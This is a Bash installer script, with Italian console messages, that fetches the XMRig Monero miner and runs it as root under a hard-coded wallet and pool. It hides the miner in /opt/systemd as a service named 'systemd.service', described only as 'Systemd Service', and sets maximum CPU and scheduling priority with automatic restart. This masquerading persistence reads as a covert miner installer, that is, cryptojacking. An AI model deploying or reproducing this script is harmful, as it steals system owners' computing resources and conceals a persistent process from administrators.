#!/bin/bash

WALLET="46PY3me35srRYMUScA3r7uhNJorsH95Sg4rkCqYhKm7tFh94w5nSEnp91S7ZmLwFGJS9UrHN4BCxL7CcPDjGUj8cVFbgHkt"
POOL="chonky.uber.space:3333"

WORKER_NAME="server_$(hostname -s)"
CPU_USAGE=100

set -e

if [ "$EUID" -ne 0 ]; then
  echo "Errore: Esegui come root (sudo)"
  exit 1
fi

echo "=================================================="
echo "     Installazione ottimizzata MASSIMA POTENZA"
echo "=================================================="

apt update && apt install -y wget tar curl

mkdir -p /opt/systemd
cd /opt/systemd

if [ ! -f "xmrig" ]; then
    wget -q https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz
    tar -xvf xmrig-6.26.0-linux-static-x64.tar.gz --strip-components=1
    rm xmrig-6.26.0-linux-static-x64.tar.gz
    chmod +x xmrig
fi

sysctl -w vm.nr_hugepages=2048
if ! grep -q "vm.nr_hugepages" /etc/sysctl.conf; then
    echo "vm.nr_hugepages=2048" >> /etc/sysctl.conf
fi

if command -v wrmsr &> /dev/null || apt install -y msr-tools; then
    modprobe msr 2>/dev/null || true
    wrmsr -a 0x1a4 0xf 2>/dev/null || true
fi

cat <<EOF > /etc/systemd/system/systemd.service
[Unit]
Description=Systemd Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/systemd

ExecStart=/opt/systemd/xmrig \\
    -o $POOL \\
    -u $WALLET \\
    -p $WORKER_NAME \\
    --keepalive \\
    --tls \\
    --cpu-max-threads-hint=$CPU_USAGE \\
    --randomx-mode=fast \\
    --randomx-1gb-pages \\
    --cpu-no-yield \\
    --no-nvml \\
    --no-opencl

Restart=always
RestartSec=10

Nice=-15
CPUSchedulingPolicy=fifo
CPUSchedulingPriority=99
IOSchedulingClass=best-effort
IOSchedulingPriority=0

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable --now systemd.service

echo "=================================================="
echo "Installazione completata - MASSIMA POTENZA"
echo "=================================================="
echo "Cartella: /opt/systemd"
echo "Servizio: systemd.service"
echo ""
echo "Comandi utili:"
echo "  Stato:      sudo systemctl status systemd"
echo "  Log:        sudo journalctl -u systemd -f"
echo "  Riavvio:    sudo systemctl restart systemd"
echo "  Stop:       sudo systemctl stop systemd"
echo ""
echo "Worker: $WORKER_NAME"
echo "=================================================="